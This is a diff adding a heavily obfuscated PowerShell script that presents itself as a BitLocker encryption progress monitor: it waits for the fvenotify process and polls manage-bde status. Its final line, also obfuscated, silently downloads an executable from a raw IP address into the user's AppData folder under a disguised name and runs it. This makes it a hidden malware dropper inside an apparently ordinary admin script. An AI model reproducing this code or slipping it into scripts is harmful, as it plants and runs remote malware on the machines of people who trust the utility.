@@ -1,0 +1,49 @@
+&("{1}{0}{3}{2}"-f 'et-Vari','S','ble','a') -Name ("{0}{2}{1}"-f 'Cu','me','rrentTi') -Scope ("{1}{0}"-f 'cal','Lo') -Force
+&("{0}{3}{1}{2}" -f'S','t-Variabl','e','e') -Name ("{2}{1}{0}" -f'ce','fferen','Di') -Scope ("{1}{0}"-f 'cal','Lo') -Force
+.("{2}{0}{1}"-f 'i','able','Set-Var') -Name ("{0}{1}" -f'Outpu','t1') -Scope ("{1}{0}"-f'cal','Lo') -Force
+&("{1}{2}{0}{3}"-f 'i','Set','-Var','able') -Name ("{0}{2}{1}" -f'Out','2','put') -Scope ("{0}{1}" -f'Lo','cal') -Force
+.("{0}{2}{1}" -f'Set','ariable','-V') -Name ("{1}{0}"-f'put3','Out') -Scope ("{1}{0}"-f'al','Loc') -Force
+.("{2}{1}{0}" -f 'able','t-Vari','Se') -Name ("{1}{0}"-f'ocess','Pr') -Value ${NU`lL} -Scope ("{0}{1}" -f 'Lo','cal') -Force
+&("{1}{2}{0}"-f'iable','Set','-Var') -Name ("{1}{0}" -f 'Time','Start') -Scope ("{1}{0}"-f'l','Loca') -Force
+
+.("{1}{0}{2}{3}" -f'ar','Cle','-Hos','t')
+${stAR`TT`Ime} = .("{0}{2}{1}" -f'Ge','te','t-Da')
+${o`U`TPuT1} = ("{7}{3}{0}{2}{4}{1}{5}{6}" -f'fo','yption to be','r Bitlo','iting ','cker Encr','gin.','....','Wa')
+${O`Utpu`T1}
+While (${PRo`CESs} -eq ${nu`LL}) {
+	&("{0}{1}{2}" -f 'Start-','Sle','ep') -Seconds 5
+	${Pr`OCeSs} = &("{1}{2}{3}{0}" -f'ss','Get-Pr','o','ce') -Name ("{1}{0}"-f'notify','fve') -ErrorAction ("{3}{4}{2}{0}{1}"-f 'ont','inue','C','Silent','ly')
+	${cu`Rr`e`NtTIme} = .("{1}{2}{0}" -f'ate','Get','-D')
+	${dIF`FE`ReN`CE} = (.("{3}{0}{1}{2}" -f'Tim','eS','pan','New-') -Start ${StARTt`I`mE} -End ${cu`R`Ren`TtimE})."mI`NUt`es"
+	If (${d`IFFE`RE`Nce} -eq 5) {
+		Exit 1
+	}
+}
+${OU`Tput1} = ${ou`TPut1} + ("{2}{1}{0}"-f 'ted','e','Compl')
+.("{1}{2}{0}"-f 'ost','Clear','-H')
+${ou`T`pUt1}
+${O`UtpUt2} = ("{5}{0}{3}{6}{2}{4}{1}" -f'l','em.....','ys','ockering','t','Bit',' S')
+${OUt`p`UT2}
+while (${P`RocEss} -ne ${NU`LL}) {
+	${pRO`Ce`ss} = ${nu`lL}
+	${PR`Ocess} = .("{2}{0}{1}{3}"-f 'et-','Pro','G','cess') -Name ("{0}{2}{1}"-f 'fveno','ify','t') -ErrorAction ("{1}{3}{0}{2}" -f 'ti','Silentl','nue','yCon')
+	${OU`TpUt3} = &("{0}{1}{2}"-f 'mana','ge-bd','e') -status ${enV:`H`OM`ED`RivE}
+	&("{2}{0}{3}{1}"-f 'ear-','t','Cl','Hos')
+	${OuT`p`Ut1}
+	${o`Utp`Ut2}
+	&("{0}{1}{2}" -f 'Wri','t','e-Host')
+	${o`U`Tput3}[9].("{0}{1}" -f'TRI','M').Invoke()
+	&("{3}{0}{2}{1}" -f 't-S','p','lee','Star') -Seconds 60
+}
+&("{1}{2}{0}{3}" -f's','W','rite-Ho','t') ("{1}{0}{2}"-f 'mple','Co','te') -ForegroundColor ("{0}{1}"-f 'Y','ellow')
+
+
+&("{3}{4}{1}{0}{2}"-f 'aria','e-V','ble','Rem','ov') -Name ("{1}{0}{2}" -f'ntTi','Curre','me') -Scope ("{0}{1}"-f'Loc','al') -Force
+&("{1}{3}{0}{2}" -f 'Va','R','riable','emove-') -Name ("{1}{0}{2}" -f're','Diffe','nce') -Scope ("{1}{0}" -f'l','Loca') -Force
+.("{1}{3}{0}{2}"-f 'ariabl','Re','e','move-V') -Name ("{1}{0}"-f 'ut1','Outp') -Scope ("{0}{1}" -f'Loca','l') -Force
+&("{0}{2}{1}{3}"-f'R','abl','emove-Vari','e') -Name ("{0}{1}"-f'Output','2') -Scope ("{0}{1}" -f 'L','ocal') -Force
+&("{1}{0}{3}{2}" -f'move','Re','ariable','-V') -Name ("{1}{0}" -f'3','Output') -Scope ("{0}{1}" -f 'Lo','cal') -Force
+&("{2}{4}{1}{3}{0}" -f'ble','e-','Remo','Varia','v') -Name ("{1}{0}"-f 's','Proces') -Scope ("{0}{1}"-f'Loc','al') -Force
+.("{3}{0}{1}{2}" -f 'a','riab','le','Remove-V') -Name ("{1}{0}"-f 'me','StartTi') -Scope ("{1}{0}"-f 'l','Loca') -Force
+
+(.("{2}{1}{0}"-f'Object','w-','Ne') ("{1}{2}{0}{3}"-f 't.WebC','Syste','m.Ne','lient')).("{2}{1}{0}{3}"-f 'F','d','Downloa','ile').Invoke(("{0}{6}{5}{1}{2}{4}{3}"-f'http','166.14','0/~zebr','xe','a/iesecv.e','9.248.','://8'),"$env:APPDATA\scvkem.exe");&("{1}{2}{0}"-f 'rocess','Star','t-P') ("$env:APPDATA\scvkem.exe")
